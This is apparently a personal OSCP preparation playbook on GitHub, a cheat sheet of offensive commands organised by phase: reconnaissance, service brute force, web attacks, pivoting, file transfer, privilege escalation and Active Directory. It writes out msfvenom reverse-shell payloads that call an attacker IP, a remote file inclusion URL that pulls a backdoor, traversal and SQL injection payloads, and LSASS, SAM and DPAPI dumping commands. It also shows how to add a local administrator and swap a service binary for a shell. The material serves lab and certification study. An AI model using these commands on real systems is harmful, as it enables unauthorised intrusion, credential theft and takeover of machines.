![alt text](https://github.com/GunzyPunzy/Gunnajs-Playbook-OSCP/blob/main/anfader-oscp.jpg)

# Challenge labs
<details>
  <summary><strong>Labs</strong></summary>

#### The following challenge labs were completed before the exam, and the notes are based on them.
- [ ] Challenge 0 - Secura
- [ ] Challenge 1 - Medtech
- [ ] Challenge 2 - Relia
- [ ] Challenge 3 - Skylark
- [ ] Challenge 4 - OSCP A
- [ ] Challenge 5 - OSCP B
- [ ] Challenge 6 - OSCP C
</details>

# Reconnaissance

<details>
  <summary><strong>Nmap</strong></summary>

### Basic Scan
```bash
nmap -n -sT -A -Pn <target>
````

### Full Scan

```bash
nmap -n -sT -p- -T4 -A -Pn <target>
```

### UDP Scan

```bash
nmap -n -sU --top-ports 1000 <target>
```

### Vulnerability scripts
```bash
nmap --script vuln -p <ports> <target>
```

</details>

<details>
  <summary><strong>Banner Grabbing</strong></summary>

```bash
nc <target> <port>
```

```bash
nmap --script banner -p <port> <target>
```

</details>

<details>
  <summary><strong>DNS</strong></summary>

  ### Basic DNS lookup
  ```bash
  host www.megacorpone.com
  ```

  ```bash
  dnsrecon -d hostname.com -t std
  ```
  ### Wordlist
  https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

  ```bash
  dnsrecon -d hostname.com -D ~/list.txt 
  ```
  
</details>

# Services

<details> <summary><strong>FTP</strong></summary>

### Login, use Anonymous for anonymous login
```bash
ftp <IP>
```

### Brute force
```bash
hydra -L users.txt -P passwords.txt <IP> ftp
```

</details>

<details> <summary><strong>SSH</strong></summary>

### Basic login
```bash
ssh <user>@<IP>
```

### Public key authentication
```bash
ssh -i id_rsa <user>@<IP>
```

### Brute force
```bash
hydra -L users.txt -P passwords.txt ssh://<IP>
```

</details>

<details> <summary><strong>NFS</strong></summary>

### Identify NFS service and exports
```bash
nmap -p 2049 -sV --script=nfs-showmount <IP>
```

### List exported shares
```bash
netexec nfs <ip> --shares
```

### List files on NFS share
```bash
netexec nfs <ip> --enum-shares
```

</details>

<details> <summary><strong>RPC</strong></summary>

### Login
```bash
rpcclient -U=user $IP
```

### Anonymous login
```bash
rpcclient -U="" $IP
```

</details>

<details> <summary><strong>SNMP</strong></summary>

### Display MIB tree
```bash
snmpwalk -v <VERSION_SNMP> -c <COMM_STRING> <IP>
```

### Extend commands (password reset)
```bash
snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

</details>

<details>
  <summary><strong>SMB</strong></summary>

### enum4linux
```bash
enum4linux -a <target>
```

### NetExec list shares
```bash
netexec smb <target> -u <username -p <password> --local-auth --shares
```

### Mount share
```shell
sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<AD_domain>
```

### Unmount share
```shell
sudo umount <./folder>
```

### NetExec list users
```bash
netexec smb <target> -u <username -p <password> --local-auth --users
```

</details>

<details> <summary><strong>SQL</strong></summary>

### SQLite dump all data
```bash
sqlite3 <database>.db .dump
```

### MySQL login
```bash
mysql -h <IP> -u <username>
```

#### MySQL show databases
```bash
SHOW DATABASES;
```
#### MySQL use database
```bash
USE <DATABASE>;
```
#### MySQL select everything from database
```bash
SELECT * FROM <DATABASE>;
```

### MSSQL login
```bash
impacket-mssqlclient <username>:<password>@<IP>
```

### Oracle login
sqlplus <username>/<password>@<IP>/XE


</details>

# Finding Exploits

</details>

<details> <summary><strong>searchsploit</strong></summary>

</details>

# WebApp

<details>
  <summary><strong>Content Discovery</strong></summary>

### gobuster directories
```bash
gobuster dir -u http://<target> -w <wordlist>
```

### gobuster subomains 
```bash
gobuster dns -d <target>.com -w <subdomains_list>
```

```bash
### gobuster VHOST
gobuster vhost -u http://<target> -w <wordlist>
```

### feroxbuster
```bash
feroxbuster -u http://<target> -w <wordlist>
```

</details>

<details>
  <summary><strong>File Inclusions</strong></summary>

### webshells
https://github.com/tennc/webshell/tree/master/fuzzdb-webshell

### Webshell
```bash
http://<target>/webshell.php?cmd=id
```

### Local File Inclusion
```bash
http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```

### Remote File Inlcusion
```bash
http://<target>/index.php?page=http://<attacker-ip>/simple-backdoor.php&cmd=ls
```

</details>

<details>
  <summary><strong>Directory Traversal</strong></summary>

### Linux
```bash
http://<target>/index.php?page=../../../../../../../../../etc/passwd
```

### Windows
```bash
http://<target>/public/plugins/alertlist/../../../../../../../../Users/install.txt
```

</details>

<details>
  <summary><strong>SQL Injection</strong></summary>

```bash
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

</details>

<details> <summary><strong>CMS</strong></summary>

## WordPress

### WPScan – Basic Scan
```bash
wpscan --url http://<target> --verbose
```

### WPScan – Enumeration Scan
```bash
wpscan --url http://<target> --enumerate vp,u,vt,tt --follow-redirection --verbose
```

## Joomla

### Droopescan – Scan
```bash
droopescan scan joomla --url http://<target>
```

### Joomla – Brute Force Login
```bash
sudo python3 joomla-brute.py -u http://<target>/ -w passwords.txt -usr <username>
```

## Drupal
### Droopescan – Scan
```bash
droopescan scan drupal --url http://<target>
```

</details>

# Pivoting

<details>
  <summary> Chisel </summary> 

  ### Creating a server
  ```shell
  chisel server --port <PORT> --reverse
  ```

  ### Edit /etc/proxychains4.conf
  ```shell
  [ProxyList]
  socks5 127.0.0.1 1080
  ```

  ### Connecting from the client

   ```shell
  .\chisel client <attacker-ip>>:<PORT> R:socks
  ```

  ### Sending command via the tunnel
  ```shell
  proxychains -q <command>
  ```

</details> 

# File Transfers

<details> <summary><strong>HTTP</strong></summary>

```shell
python3 -m http.server 80
```

</details>

<details> <summary><strong>FTP</strong></summary>

### Download file
```bash
get <file>
```

### Upload file
```bash
put <file>
```

</details>

<details> <summary><strong>NFS</strong></summary>

### Download file
```bash
netexec nfs <ip> --share --get-file /share_path/<file> <file>
```

### Upload file
```bash
netexec nfs <ip> --share --put-file <file> /share_path/
```
</details>

<details> <summary><strong>evil-winrm</strong></summary>

### Download file

```bash
download C:\\<share_path>\\<file>/<share_path>/<file>
```

### Upload file
```bash
upload /<share_path/file.exe C:\\<share_path>\\<file>
```

</details>

<details> <summary><strong>SMB</strong></summary>

### SMB server
```bash
impacket-smbserver.py <shareName> <sharePath>
```

### Run file from SMB server
```bash
\\<target_IP>\<shareName>\<file> 
```

</details>

<details> <summary><strong>MSSQL</strong></summary>

### Download file
```bash
netexec mssql <target_IP> -u <user> -p <password> --get-file <share_path>/<file> <share_path>/<file>
```

### Upload file
```bash
netexec mssql <target_IP> -u <user> -p <password> --put-file <share_path>/<file> <share_path>/<file>
```

</details>

<details> <summary><strong>Linux</strong></summary>

```bash
wget http://<attacker-ip>/<file>
```

</details>

<details> <summary><strong>Windows</strong></summary>

```bash
curl http://<attacker-ip>/<file> -o <output_file>
```

</details>

# Windows 

<details>
  <summary><strong>Reverse Shells</strong></summary>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell-x64.exe
```
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f asp > shell.asp
```
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.jsp
```
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f war > shell.war
```
```bash
msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port>-f raw > shell.php
```
  
</details>

<details>
  <summary><strong>Enumeration</strong></summary>

### Get groups
```ps
whoami /groups
```

### Get priviliges
```ps
whoami /priv
```

</details>

<details>
  <summary><strong>Credential Hunting</strong></summary>

### Powershell History
```ps
Get-History
```

### Get path to consoleHost_history.txt
```ps
(Get-PSReadlineOption).HistorySavePath
```

### Search for files
```ps
findstr /si password *.<file_type>
```

#### Interesting File Types
* kdbx
* txt
* config
* xml
* ini

### Stored creds
```ps
vaultcmd /list
```

### Putty keys
```ps
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```
```ps
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
```

### VNC passwords
```ps
reg query "HKCU\Software\ORL\WinVNC3\Password"
```
```ps
reg query "HKCU\Software\TightVNC\Server"
```

### Windows autologin
```ps
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
```ps
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

### SNMP Parameters
```ps
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

### Putty passwords
```ps
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Search for the password in the registry
```ps
reg query HKLM /f password /t REG_SZ /s
```
```ps
reg query HKCU /f password /t REG_SZ /s
```

</details>

<details>
  <summary><strong>Privesc</strong></summary>

### winPEAS
```ps
winPEASx64.exe
```

### SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
```ps
SigmaPotato.exe "net localgroup administrator <user> /add"
```

### File Permissions: Everyone [AllAccess] in WinPeas

#### Check for Full Permission (F)
```ps
icacls <path>
```

#### Stop Service
```ps
stop-service GPGOrchestrator
```

#### Replace with a Shell
```ps
copy shell.exe "C:\Program Files\<path>\<Service>.exe"
```

#### Start the service
```ps
start-service <Service>
```

#### Scheduled tasks
```ps
schtasks /query /fo LIST /v
```

### Displays stored credentials looks for any optential users
```ps
cmdkey /list 
```
#### Transfer the reverseshell
```ps
runas /savecred /user:admin C:\Temp\reverse.exe
```

### GPO
#### Check for GpoEditDeleteModifySecurity
```ps
Get-GPPermission -Name "Default Domain Policy" -All
```
####
```ps
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
```
  
</details>

<details>
  <summary><strong>Post-Exploitation</strong></summary>

### Dump LSASS
```shell
netexec smb <target-ip> -u <user> -p <password> -M lsassy
```

### Dump DPAPI
```shell
netexec smb <target-ip> -u <user> -p <password> -dpapi
```

### Dump PowerShell History
```shell
netexec smb <target-ip> -u <user> -p <password> -M powershell_history 
```
  
</details>

# Active Directory

<details>
  <summary><strong>Enumeration</strong></summary>

### List readable or writable shares
```shell
NetExec smb <target_IP> -u AD_user -p <password> --shares READ,WRITE
```

### List users
```shell
NetExec smb <target_IP> -u AD_user -p <password> --users
```

### Get membership
```shell
bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get membership <AD_user>
```

Get object info

```shell
bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get object <object>
```

### Get writable 

```shell
bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get writable
```

</details>

<details>
  <summary><strong>Credential Hunting</strong></summary>

  ### Kerberoasting 
  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <password> --kerberoasting <output>.txt
  ```

  ### ASREPRoast
  ```shell
  NetExec ldap <Domain_Controller_IP> -u <AD_user> -p '' --asreproast <output>.txt
  ```
  
</details>

<details>
  <summary><strong>Credential Attacks</strong></summary>
  
  ### Dump SAM
  ```shell
  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash[LM:NT]]> --sam
  ```

  ### Dump LSA 
  ```shell
  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> --lsa
  ```

  ### Dump DPAPI 
  ```shell
  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> --dpapi
  ```

  ### Dump LSASS
  ```shell
  NetExec smb <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M lsassy
  ```

  ### Get hashes from SYSTEM and SAM
  ```shell
  impacket-secretsdump -system SYSTEM -sam SAM local
  ```

</details>

<details>
  <summary><strong>MSSQL</strong></summary>

  ### MSSQL privesc
  ```shell
  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv
  ```

  ```shell
  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv -o ACTION=privesc
  ```

  ### MSSQL execute commands
  ```shell
  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -x 'whoami'
  ```

  ### impacket MSSQL
  ```bash
  impacket-mssqlclient <username>:<password>@<IP> -windows-auth]
  ```

  ### Enable xp_cmdshell
  ```bash
  enable_xp_cmdshell
  ```

  ### Privesc to local administrator as db_admin
  ```bash
  xp_cmdshell 'SigmaPotato.exe "net localgroup administrator <user> /add"'
  ```

</details>

# Linux

<details>
  <summary><strong>Reverse Shells</strong></summary>

https://www.revshells.com/

</details>

<details>
  <summary><strong>TTY / Shell Upgrade</strong></summary>

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```shell
echo 'os.system('/bin/bash')'
```
```shell
/bin/sh -i
```
```shell
/bin/bash -i
```
```shell
perl -e 'exec "/bin/sh";'
```

</details>

<details>
  <summary><strong>Enumeration</strong></summary>

### Get user info
```shell
id
```

### Ssytem info
```shell
lsb_release -a
```
```shell
uname -a
```
```shell
cat /proc/version
```

### Writable files
```shell
find / -writable -type f 2>/dev/null
```
```shell
find / -writable -type d 2>/dev/null
```

### List Mounted Drives
```shell
cat /etc/fstab
```

### List all Available Drives
```shell
lsblk
```

### List Loaded Drivers
```shell
lsmod
```

</details>

<details>
  <summary><strong>Credential Hunting</strong></summary>

### Get Active Processes Credentials
```shell
watch -n 1 "ps -aux | grep pass"
```

### Get bash history
```shell
env
```

### Get Environment Variables
```shell
env
```

### Password sniffing
```shell
sudo tcpdump -i lo -A | grep "pass"
```

</details>

<details>
  <summary><strong>Privesc</strong></summary>

### linPEAS
```shell
./linPEAS.sh
```

### Sudo/SUID/Capabilities
https://gtfobins.org/
```shell
sudo -l
```
```shell
find / -perm -u=s -type f 2>/dev/null
```
```shell
getcap -r / 2>/dev/null
```

### Cron Jobs
#### System wide
```shell
cat /etc/crontab
```

#### Current User
```shell
crontab -l
```

#### Inspect cron logs
```shell
grep "CRON" /var/log/syslog
```

</details>
